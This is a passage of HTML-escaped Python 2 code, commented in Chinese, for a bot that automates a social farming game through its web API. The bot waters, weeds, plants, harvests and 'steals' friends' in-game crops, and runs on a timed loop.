&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;curpage+=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'Page:%d' % curpage<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取所有好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def listFriends(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url="http://xn.hf.fminutes.com/api.php?mod=friend&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=" % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.friends=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取某好友信息<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def showFriend(self,fid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=user&amp;act=run&amp;flag=1&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 浇水 fid: 用户ID place:土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def water(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=water&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 除草 fid:用户ID place:土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def clearWeed(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=clearWeed&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 杀虫 fid:用户ID place: 土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def spraying(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=spraying&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid,'tId':0,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 获取商店列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def scanShop(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=shop&amp;act=getShopInfo&amp;type=1&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print url<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.shop=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return self.shop<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 查看自己购买的物品<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def getBag(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=Package&amp;act=getPackageInfo&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.bag=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return self.bag<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 翻土<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def scarity(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=scarify&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 种植 cid: 种子编号 uid: 用户编号 place: 土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def plant(self,cid,uid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=planting&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'cId':cid,'ownerId':uid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 施肥 <br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def fert(self,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=fertilize&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':self.uid,'tId':1,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 某好友的果实成熟时间列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def find(self,fid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.scanShop()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=user&amp;act=run&amp;flag=1&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret=json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;lands=ret['farmlandStatus']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;result={}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;i=0<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for land in lands:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;seeds=[x for x in self.shop['1'] if x['cId']==land['a']]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(seeds) == 1:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;durtime=int(seeds[0]['growthCycle'])+land['q']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if durtime &gt; time.time():#尚未成熟<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;result[i]='%s:\t%s' % (seeds[0]['cName'],str(durtime));<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:#已经成熟<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if 1==land['n']: #已经偷过<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pass<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:#<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;result[i]='%s:\tReady' % seeds[0]['cName']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;i+=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return result<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 偷好友的果子 fid:好友编号 place:土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def steal(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=scrounge&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={"ownerId":fid,"place":place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def harvest(self,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=harvest&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':self.uid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 查找果实列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def autofind(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;result={}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for f in farm.friends: #输出所有好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;result[f['userId']]=farm.find(f['userId'])<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return result<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 升级<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def moneyGo(self,n=1):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for i in range(n):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print i<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.scarity(self.uid,0)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.plant(2,self.uid,0)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 自动运行 默认最小间隔20分钟<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def autorun(self,interval=20*60):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(self.friends)==0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(self.shop)==0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.scanShop()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.bag=self.getBag() #背包<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret={} #下次运行时间<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for friend in self.friends:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print (time.ctime()+friend['userName']).encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;lands=self.showFriend(friend['userId'])['farmlandStatus']<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;i=-1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for land in lands:#每块地<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;i+=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;s=[x for x in self.shop['1'] if x['cId']==land['a']]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(s)==0:#空地<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'\t%d\t空地'.encode('utf-8') % i<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(s)==1:#不是空地<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;durtime=land['q']+int(s[0]['growthCycle'])<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if durtime &lt; time.time(): #已经成熟<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if friend['userId']==self.uid: #自己的地，收获<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if land['b']==6: #成熟<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.harvest(i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=u'收获'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif land['b']==7: #已经收获<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=u'已收'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=u'未知'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autoplant: #自动种植<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if land['b'] 